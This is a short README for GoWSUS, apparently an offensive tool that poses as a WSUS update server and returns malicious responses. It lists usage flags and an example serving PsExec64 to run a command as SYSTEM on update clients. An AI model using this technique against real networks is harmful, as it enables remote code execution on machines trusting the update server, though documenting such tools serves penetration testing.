# GoWSUS
This is intended to impersonate a legitimate WSUS server and send malicious responses.

## TL;DR
Code re-used from:
- https://github.com/GoSecure/pywsus

## Usage
```
Usage:
gowsus.exe -H HOST -p PORT -e EXECUTABLE -c COMMAND

Options:
 -H The listening adress. (default "127.0.0.1")
 -p The listening port. (default "8530")
 -e The Microsoft signed executable returned to the client.
 -c The parameters for the current executable.

Example:
gowsus.exe -H X.X.X.X -p 8530 -e PsExec64.exe -c "-accepteula -s calc.exe"
```